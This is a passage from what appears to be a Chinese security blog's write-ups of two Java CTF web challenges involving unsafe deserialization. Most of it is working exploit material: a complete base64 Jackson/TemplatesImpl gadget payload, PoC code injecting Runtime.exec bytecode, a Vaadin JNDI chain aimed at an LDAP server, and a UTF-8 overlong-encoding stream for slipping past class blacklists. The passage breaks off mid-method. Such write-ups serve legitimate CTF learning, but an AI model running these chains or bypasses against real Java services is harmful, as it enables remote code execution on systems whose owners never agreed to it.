# Java-CTF(3)

  
  
&lt;!--more--&gt;  
# security system  
## 0x01 解题记录  
只存在一个路由`/safeobject`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411281655722.png)
- 传入`obj`和`classes`，并反射获取 classes 的类作为反序列化的类，obj 为 json 字符串  
- 在 if 分支里，可以对obj 做 jackson 解析，然后给到`SecurityCheck.deObject()`方法处理后再调用toString返回  
- 在else分支里会获取 SecurityCheck 的 treeMap 属性，并且做反序列化  
- SecurityCheck 的 safe 属性可以控制进入 if 和 else  
这里并没有设置 mapper 属性，所以无法直接打 Jackson  
漏洞点在`SecurityCheck.deObject`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411281959468.png)
传入对象的`@type`属性去加载这个指定类然后返回这个初始化这个类  
把传入的值以map的形式生成一个迭代器，对每个 key 进行一次遍历取出 key 和 value 来进行反射属性赋值。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411282007516.png)
利用这里便可以做到初始化任意对象和构造任意属性了  
只需要绕过一下`if (ob instanceof LinkedHashMap) {`即可，找一个继承类  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411282011839.png)
这里直接打`POJONode#toString`，  
```java  
obj={&#34;@type&#34;:&#34;com.fasterxml.jackson.databind.node.POJONode&#34;}&amp;classes=org.springframework.ui.ExtendedModelMap  
```  
但是并不行，只能调用无参构造函数，其中`POJONode`并没有无参构造  
在`else`分支里面  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411282019717.png)
存在反序列化方法，并且反序列化的值是用`SecurityCheck`的`treeMap`控制的，  
`treeMap`是一个存储着序列化的`base64`值的`hashset`  
接下来就是取这个`hashset`里的值进行反序列化，直接打 Jackson 链即可  
```json  
{  
  &#34;@type&#34;: &#34;com.example.jackson.SecurityCheck&#34;,  
  &#34;safe&#34;: false,  
  &#34;treeMap&#34;: { &#34;@type&#34;: &#34;java.util.HashSet&#34;, &#34;map&#34;: { &#34;base64encode&#34;: null } }  
}  
```  
exp  
```http  
obj={&#34;@type&#34;: &#34;com.example.jackson.SecurityCheck&#34;,&#34;safe&#34;: false,&#34;treeMap&#34;:{&#34;@type&#34;:&#34;java.util.HashSet&#34;,&#34;map&#34;:{&#34;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAIXQAA1BvY3QACFBvYy5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB&#43;ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAARaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7WwARcHJveGllZEludGVyZmFjZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAFWgALcHJlRmlsdGVyZWRMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzcQB&#43;AAdMAAppbnRlcmZhY2VzcQB&#43;AAdMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS/Pmp&#43;D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAABzcgA8b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkRlZmF1bHRBZHZpc29yQ2hhaW5GYWN0b3J5VN1kN&#43;JOcfcCAAB4cHNxAH4AFAAAAAB3BAAAAAB4c3EAfgAUAAAAAHcEAAAAAHhzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AudGFyZ2V0LlNpbmdsZXRvblRhcmdldFNvdXJjZX1VbvXH&#43;Pq6AgABTAAGdGFyZ2V0cQB&#43;AAF4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB&#43;ACBMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAHoyv66vgAAADQAGwEAJVRlc3RfZmI5MmQxYjgzZTQ0NDc0ZmEyMjY3ZmZkYTI0NmMyMjAHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAKlRlc3RfZmI5MmQxYjgzZTQ0NDc0ZmEyMjY3ZmZkYTI0NmMyMjAuamF2YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAcBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcADAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA4ADwoADQAQAQASdG91Y2ggL3RtcC9zdWNjZXNzCAASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAFAAVCgANABYBAAY8aW5pdD4MABgACgoACAAZACEAAgAIAAAAAAACAAgACQAKAAEACwAAABYAAgAAAAAACrgAERITtgAXV7EAAAAAAAEAGAAKAAEACwAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAZwdAAHdXNlbGVzc3B3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAADdnIAI29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLlNwcmluZ1Byb3h5AAAAAAAAAAAAAAB4cHZyAClvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuQWR2aXNlZAAAAAAAAAAAAAAAeHB2cgAob3JnLnNwcmluZ2ZyYW1ld29yay5jb3JlLkRlY29yYXRpbmdQcm94eQAAAAAAAAAAAAAAeHA=&#34;:null}}&amp;classes=org.springframework.ui.ExtendedModelMap  
```  
Jackson链子  
```java  
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import javassist.*;    
import org.springframework.aop.framework.AdvisedSupport;    
import javax.management.BadAttributeValueExpException;    
import javax.xml.transform.Templates;    
import java.io.*;    
import java.lang.reflect.*;    
import java.util.Base64;    
import com.fasterxml.jackson.databind.node.BaseJsonNode;    
import java.util.UUID;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;,  null);    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
    
        //利用 JdkDynamicAopProxy 进行封装使其稳定触发    
        Class&lt;?&gt; clazz = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;);    
        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);    
        cons.setAccessible(true);    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(templates);    
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);    
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);    
    
        POJONode node = new POJONode(proxyObj);    
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);    
        setFieldValue(val,&#34;val&#34;,node);    
        System.out.println(serialize(val));    
    }    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;touch /tmp/success\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411282310123.png)
成功写入  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411282309120.png)
#  2024HECTF ezjava  
## 0x01 解题记录  
存在`file`路由  
```java  
@PostMapping({&#34;/file&#34;})    
public String index(@RequestParam String data) throws Exception {    
    System.out.println(data);    
    if (data != null &amp;&amp; !data.equals(&#34;&#34;)) {    
        string = data;    
        this.deserialize(string);    
        return &#34;redirect:/index.html&#34;;    
    } else {    
        return &#34;redirect:/error.html&#34;;    
    }    
}  
```  
这里存在一个反序列化，  
```java  
public Object deserialize(String base64data) {    
    try {    
        byte[] decode = Base64.getDecoder().decode(base64data.toString().replace(&#34;\r\n&#34;, &#34;&#34;));    
        String payload = new String(decode);    
        if ((new normal(payload)).blacklist(payload)) {    
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(base64data.toString().replace(&#34;\r\n&#34;, &#34;&#34;)));    
            ObjectInputStream ois = new MyObjectInputStream(byteArrayInputStream);    
            ois.readObject();    
            ois.close();    
            return ois;    
        } else {    
            return &#34;redirect:/error.html&#34;;    
        }    
    } catch (Exception var6) {    
        Exception var6 = var6;    
        Exception e = var6;    
        e.printStackTrace();    
        return null;    
    }    
}  
```  
其中重写了`resolveClass`  
```java  
protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {    
    String className = desc.getName().toLowerCase();    
    String[] denyClasses = new String[]{&#34;java.net.InetAddress&#34;, &#34;org.apache.commons.collections.Transformer&#34;, &#34;org.apache.commons.collections.functors&#34;, &#34;C3P0&#34;, &#34;Jackson&#34;, &#34;NestedMethodProperty&#34;, &#34;TemplatesImpl&#34;};    
    String[] var4 = denyClasses;    
    int var5 = denyClasses.length;    
    
    for(int var6 = 0; var6 &lt; var5; &#43;&#43;var6) {    
        String denyClass = var4[var6].toLowerCase();    
        if (className.contains(denyClass)) {    
            throw new InvalidClassException(&#34;Unauthorized deserialization attempt&#34;, className);    
        }    
    }    
    
    return super.resolveClass(desc);    
}  
```  
禁用了一些类  
```java  
String[] denyClasses = new String[]{&#34;java.net.InetAddress&#34;, &#34;org.apache.commons.collections.Transformer&#34;, &#34;org.apache.commons.collections.functors&#34;, &#34;C3P0&#34;, &#34;Jackson&#34;, &#34;NestedMethodProperty&#34;, &#34;TemplatesImpl&#34;};    
```  
还有一个`blacklist`  
```java  
String[] blacklist = new String[]{&#34;BadAttributeValueExpException&#34;, &#34;Collections$UnmodifiableList&#34;, &#34;PropertysetItem&#34;, &#34;AbstractClientConnector&#34;, &#34;Enum&#34;, &#34;SQLContainer&#34;, &#34;LinkedHashMap&#34;, &#34;TableQuery&#34;, &#34;AbstractTransactionalQuery&#34;, &#34;J2EEConnectionPool&#34;, &#34;DefaultSQLGenerator&#34;};  
```  
`blacklist`直接用`UTF-8 Overlong Encoding`绕过  
其中`denyClasses`用`vaadin`绕过打 JNDI  
https://www.aiwin.fun/index.php/archives/4423/  
构造 Poc  
```java  
import com.vaadin.data.util.PropertysetItem;    
import com.vaadin.data.util.sqlcontainer.RowId;    
import com.vaadin.data.util.sqlcontainer.SQLContainer;    
import com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;    
import com.vaadin.data.util.sqlcontainer.query.TableQuery;    
import com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;    
import com.vaadin.ui.NativeSelect;    
import sun.reflect.ReflectionFactory;    
import utf.CustomObjectOutputStream;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayInputStream;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectInputStream;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.Field;    
import java.lang.reflect.InvocationTargetException;    
import java.sql.SQLException;    
import java.util.ArrayList;    
import java.util.Base64;    
    
public class Poc {    
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, SQLException {    
    
        J2EEConnectionPool j2EEConnectionPool = new J2EEConnectionPool(&#34;ldap://127.0.0.1:1389/enankz&#34;);    
        Class&lt;?&gt; table = Class.forName(&#34;com.vaadin.data.util.sqlcontainer.query.TableQuery&#34;);    
        TableQuery tableQuery = (TableQuery) createWithoutConstructor(table);    
    
        setSuperValue(tableQuery, &#34;connectionPool&#34;, j2EEConnectionPool);    
        setFieldValue(tableQuery, &#34;primaryKeyColumns&#34;, new ArrayList&lt;&gt;());    
        setFieldValue(tableQuery, &#34;sqlGenerator&#34;, new DefaultSQLGenerator());    
    
        Constructor&lt;SQLContainer&gt; sql = SQLContainer.class.getDeclaredConstructor();    
        sql.setAccessible(true);    
        SQLContainer sqlContainer = sql.newInstance();    
        setFieldValue(sqlContainer, &#34;queryDelegate&#34;, tableQuery);    
    
    
        NativeSelect nativeSelect = new NativeSelect();    
        RowId rowId = new RowId(new RowId(&#34;1&#34;));    
        setSuperValue(nativeSelect, &#34;value&#34;, rowId);    
        setSuperValue(nativeSelect, &#34;items&#34;, sqlContainer);    
        setSuperValue(nativeSelect, &#34;multiSelect&#34;, true);    
    
        PropertysetItem pItem = new PropertysetItem();    
        pItem.addItemProperty(&#34;test&#34;, nativeSelect);    
    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&#34;test&#34;);    
        setFieldValue(badAttributeValueExpException, &#34;val&#34;, pItem);    
        String base64payload = serialize(badAttributeValueExpException);    
        System.out.println(base64payload);    
        //unserialize(base64payload);    
    }    
    
    public static void unserialize(String base) throws IOException, ClassNotFoundException {    
        byte[] result = Base64.getDecoder().decode(base);    
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);    
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);    
        objectInputStream.readObject();    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        CustomObjectOutputStream ObjectOutputStream = new CustomObjectOutputStream(byteArrayOutputStream);    
        ObjectOutputStream.writeObject(object);    
        //System.out.println(byteArrayOutputStream.toString());    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static &lt;T&gt; Object createWithoutConstructor(Class&lt;?&gt; classToInstantiate) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {    
        return createWithoutConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);    
    }    
    
    public static &lt;T&gt; T createWithoutConstructor(Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {    
        Constructor&lt;?&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);    
        objCons.setAccessible(true);    
        Constructor&lt;?&gt; constructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);    
        constructor.setAccessible(true);    
        return (T) constructor.newInstance(consArgs);    
    }    
    
    public static void setFieldValue(Object object, String name, Object value) throws NoSuchFieldException, IllegalAccessException {    
        Field field = object.getClass().getDeclaredField(name);    
        field.setAccessible(true);    
        field.set(object, value);    
    }    
    
    public static void setSuperValue(Object object, String name, Object value) throws NoSuchFieldException, IllegalAccessException {    
        Field field = getField(object.getClass(), name);    
        field.setAccessible(true);    
        field.set(object, value);    
    }    
    
    private static Field getField(Class&lt;?&gt; clazz, String fieldName) {    
        while (clazz != null) {    
            try {    
                return clazz.getDeclaredField(fieldName);    
            } catch (NoSuchFieldException e) {    
                clazz = clazz.getSuperclass();    
            }    
        }    
        return null;    
    }    
    
}  
```  
其中`CustomObjectOutputStream`  
```java  
package utf;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import java.lang.reflect.InvocationTargetException;    
import java.lang.reflect.Method;    
import java.util.HashMap;    
import java.util.Map;    
/**    
 * 参考p神：https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg    
 * 参考1ue：https://t.zsxq.com/17LkqCzk8    
 * 实现：参考 OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)方法    
 */    
public class CustomObjectOutputStream extends ObjectOutputStream {    
    
    public CustomObjectOutputStream(OutputStream out) throws IOException {    
        super(out);    
    }    
    
    private static HashMap&lt;Character, int[]&gt; map;    
    private static Map&lt;Character,int[]&gt; bytesMap=new HashMap&lt;&gt;();    
    
    static {    
        map = new HashMap&lt;&gt;();    
        map.put(&#39;.&#39;, new int[]{0xc0, 0xae});    
        map.put(&#39;;&#39;, new int[]{0xc0, 0xbb});    
        map.put(&#39;$&#39;, new int[]{0xc0, 0xa4});    
        map.put(&#39;[&#39;, new int[]{0xc1, 0x9b});    
        map.put(&#39;]&#39;, new int[]{0xc1, 0x9d});    
        map.put(&#39;a&#39;, new int[]{0xc1, 0xa1});    
        map.put(&#39;b&#39;, new int[]{0xc1, 0xa2});    
        map.put(&#39;c&#39;, new int[]{0xc1, 0xa3});    
        map.put(&#39;d&#39;, new int[]{0xc1, 0xa4});    
        map.put(&#39;e&#39;, new int[]{0xc1, 0xa5});    
        map.put(&#39;f&#39;, new int[]{0xc1, 0xa6});    
        map.put(&#39;g&#39;, new int[]{0xc1, 0xa7});    
        map.put(&#39;h&#39;, new int[]{0xc1, 0xa8});    
        map.put(&#39;i&#39;, new int[]{0xc1, 0xa9});    
        map.put(&#39;j&#39;, new int[]{0xc1, 0xaa});    
        map.put(&#39;k&#39;, new int[]{0xc1, 0xab});    
        map.put(&#39;l&#39;, new int[]{0xc1, 0xac});    
        map.put(&#39;m&#39;, new int[]{0xc1, 0xad});    
        map.put(&#39;n&#39;, new int[]{0xc1, 0xae});    
        map.put(&#39;o&#39;, new int[]{0xc1, 0xaf});    
        map.put(&#39;p&#39;, new int[]{0xc1, 0xb0});    
        map.put(&#39;q&#39;, new int[]{0xc1, 0xb1});    
        map.put(&#39;r&#39;, new int[]{0xc1, 0xb2});    
        map.put(&#39;s&#39;, new int[]{0xc1, 0xb3});    
        map.put(&#39;t&#39;, new int[]{0xc1, 0xb4});    
        map.put(&#39;u&#39;, new int[]{0xc1, 0xb5});    
        map.put(&#39;v&#39;, new int[]{0xc1, 0xb6});    
        map.put(&#39;w&#39;, new int[]{0xc1, 0xb7});    
        map.put(&#39;x&#39;, new int[]{0xc1, 0xb8});    
        map.put(&#39;y&#39;, new int[]{0xc1, 0xb9});    
        map.put(&#39;z&#39;, new int[]{0xc1, 0xba});    
        map.put(&#39;A&#39;, new int[]{0xc1, 0x81});    
        map.put(&#39;B&#39;, new int[]{0xc1, 0x82});    
        map.put(&#39;C&#39;, new int[]{0xc1, 0x83});    
        map.put(&#39;D&#39;, new int[]{0xc1, 0x84});    
        map.put(&#39;E&#39;, new int[]{0xc1, 0x85});    
        map.put(&#39;F&#39;, new int[]{0xc1, 0x86});    
        map.put(&#39;G&#39;, new int[]{0xc1, 0x87});    
        map.put(&#39;H&#39;, new int[]{0xc1, 0x88});    
        map.put(&#39;I&#39;, new int[]{0xc1, 0x89});    
        map.put(&#39;J&#39;, new int[]{0xc1, 0x8a});    
        map.put(&#39;K&#39;, new int[]{0xc1, 0x8b});    
        map.put(&#39;L&#39;, new int[]{0xc1, 0x8c});    
        map.put(&#39;M&#39;, new int[]{0xc1, 0x8d});    
        map.put(&#39;N&#39;, new int[]{0xc1, 0x8e});    
        map.put(&#39;O&#39;, new int[]{0xc1, 0x8f});    
        map.put(&#39;P&#39;, new int[]{0xc1, 0x90});    
        map.put(&#39;Q&#39;, new int[]{0xc1, 0x91});    
        map.put(&#39;R&#39;, new int[]{0xc1, 0x92});    
        map.put(&#39;S&#39;, new int[]{0xc1, 0x93});    
        map.put(&#39;T&#39;, new int[]{0xc1, 0x94});    
        map.put(&#39;U&#39;, new int[]{0xc1, 0x95});    
        map.put(&#39;V&#39;, new int[]{0xc1, 0x96});    
        map.put(&#39;W&#39;, new int[]{0xc1, 0x97});    
        map.put(&#39;X&#39;, new int[]{0xc1, 0x98});    
        map.put(&#39;Y&#39;, new int[]{0xc1, 0x99});    
        map.put(&#39;Z&#39;, new int[]{0xc1, 0x9a});    
        map.put(&#39;4&#39;, new int[]{0xc0, 0xb4});    
        map.put(&#39;2&#39;, new int[]{0xc0, 0xb2});    
        map.put(&#39;1&#39;, new int[]{0xc0, 0xb1});    
    
    
        bytesMap.put(&#39;$&#39;, new int[]{0xe0,0x80,0xa4});    
        bytesMap.put(&#39;.&#39;, new int[]{0xe0,0x80,0xae});    
        bytesMap.put(&#39;;&#39;, new int[]{0xe0,0x80,0xbb});    
        bytesMap.put(&#39;A&#39;, new int[]{0xe0,0x81,0x81});    
        bytesMap.put(&#39;B&#39;, new int[]{0xe0,0x81,0x82});    
        bytesMap.put(&#39;C&#39;, new int[]{0xe0,0x81,0x83});    
        bytesMap.put(&#39;D&#39;, new int[]{0xe0,0x81,0x84});    
        bytesMap.put(&#39;E&#39;, new int[]{0xe0,0x81,0x85});    
        bytesMap.put(&#39;F&#39;, new int[]{0xe0,0x81,0x86});    
        bytesMap.put(&#39;G&#39;, new int[]{0xe0,0x81,0x87});    
        bytesMap.put(&#39;H&#39;, new int[]{0xe0,0x81,0x88});    
        bytesMap.put(&#39;I&#39;, new int[]{0xe0,0x81,0x89});    
        bytesMap.put(&#39;J&#39;, new int[]{0xe0,0x81,0x8a});    
        bytesMap.put(&#39;K&#39;, new int[]{0xe0,0x81,0x8b});    
        bytesMap.put(&#39;L&#39;, new int[]{0xe0,0x81,0x8c});    
        bytesMap.put(&#39;M&#39;, new int[]{0xe0,0x81,0x8d});    
        bytesMap.put(&#39;N&#39;, new int[]{0xe0,0x81,0x8e});    
        bytesMap.put(&#39;O&#39;, new int[]{0xe0,0x81,0x8f});    
        bytesMap.put(&#39;P&#39;, new int[]{0xe0,0x81,0x90});    
        bytesMap.put(&#39;Q&#39;, new int[]{0xe0,0x81,0x91});    
        bytesMap.put(&#39;R&#39;, new int[]{0xe0,0x81,0x92});    
        bytesMap.put(&#39;S&#39;, new int[]{0xe0,0x81,0x93});    
        bytesMap.put(&#39;T&#39;, new int[]{0xe0,0x81,0x94});    
        bytesMap.put(&#39;U&#39;, new int[]{0xe0,0x81,0x95});    
        bytesMap.put(&#39;V&#39;, new int[]{0xe0,0x81,0x96});    
        bytesMap.put(&#39;W&#39;, new int[]{0xe0,0x81,0x97});    
        bytesMap.put(&#39;X&#39;, new int[]{0xe0,0x81,0x98});    
        bytesMap.put(&#39;Y&#39;, new int[]{0xe0,0x81,0x99});    
        bytesMap.put(&#39;Z&#39;, new int[]{0xe0,0x81,0x9a});    
        bytesMap.put(&#39;[&#39;, new int[]{0xe0,0x81,0x9b});    
        bytesMap.put(&#39;]&#39;, new int[]{0xe0,0x81,0x9d});    
        bytesMap.put(&#39;a&#39;, new int[]{0xe0,0x81,0xa1});    
        bytesMap.put(&#39;b&#39;, new int[]{0xe0,0x81,0xa2});    
        bytesMap.put(&#39;c&#39;, new int[]{0xe0,0x81,0xa3});    
        bytesMap.put(&#39;d&#39;, new int[]{0xe0,0x81,0xa4});    
        bytesMap.put(&#39;e&#39;, new int[]{0xe0,0x81,0xa5});    
        bytesMap.put(&#39;f&#39;, new int[]{0xe0,0x81,0xa6});    
        bytesMap.put(&#39;g&#39;, new int[]{0xe0,0x81,0xa7});    
        bytesMap.put(&#39;h&#39;, new int[]{0xe0,0x81,0xa8});    
        bytesMap.put(&#39;i&#39;, new int[]{0xe0,0x81,0xa9});    
        bytesMap.put(&#39;j&#39;, new int[]{0xe0,0x81,0xaa});    
        bytesMap.put(&#39;k&#39;, new int[]{0xe0,0x81,0xab});    
        bytesMap.put(&#39;l&#39;, new int[]{0xe0,0x81,0xac});    
        bytesMap.put(&#39;m&#39;, new int[]{0xe0,0x81,0xad});    
        bytesMap.put(&#39;n&#39;, new int[]{0xe0,0x81,0xae});    
        bytesMap.put(&#39;o&#39;, new int[]{0xe0,0x81,0xaf});    
        bytesMap.put(&#39;p&#39;, new int[]{0xe0,0x81,0xb0});    
        bytesMap.put(&#39;q&#39;, new int[]{0xe0,0x81,0xb1});    
        bytesMap.put(&#39;r&#39;, new int[]{0xe0,0x81,0xb2});    
        bytesMap.put(&#39;s&#39;, new int[]{0xe0,0x81,0xb3});    
        bytesMap.put(&#39;t&#39;, new int[]{0xe0,0x81,0xb4});    
        bytesMap.put(&#39;u&#39;, new int[]{0xe0,0x81,0xb5});    
        bytesMap.put(&#39;v&#39;, new int[]{0xe0,0x81,0xb6});    
        bytesMap.put(&#39;w&#39;, new int[]{0xe0,0x81,0xb7});    
        bytesMap.put(&#39;x&#39;, new int[]{0xe0,0x81,0xb8});    
        bytesMap.put(&#39;y&#39;, new int[]{0xe0,0x81,0xb9});    
        bytesMap.put(&#39;z&#39;, new int[]{0xe0,0x81,0xba});    
    
    }    
    
    
    
    public void charWritTwoBytes(String name){    
        //将name进行overlong Encoding    
        byte[] bytes=new byte[name.length() * 2];    
        int k=0;    
        StringBuffer str=new StringBuffer();    
        for (int i = 0; i &lt; name.length(); i&#43;&#43;) {    
            int[] bs = map.get(name.charAt(i));    
            bytes[k&#43;&#43;]= (byte) bs[0];    
            bytes[k&#43;&#43;]= (byte) bs[1];    
            str.append(Integer.toHexString(bs[0])&#43;&#34;,&#34;);    
            str.append(Integer.toHexString(bs[1])&#43;&#34;,&#34;);    
        }    
        System.out.println(str.toString());    
        try {    
            writeShort(name.length() * 2);    
            write(bytes);    
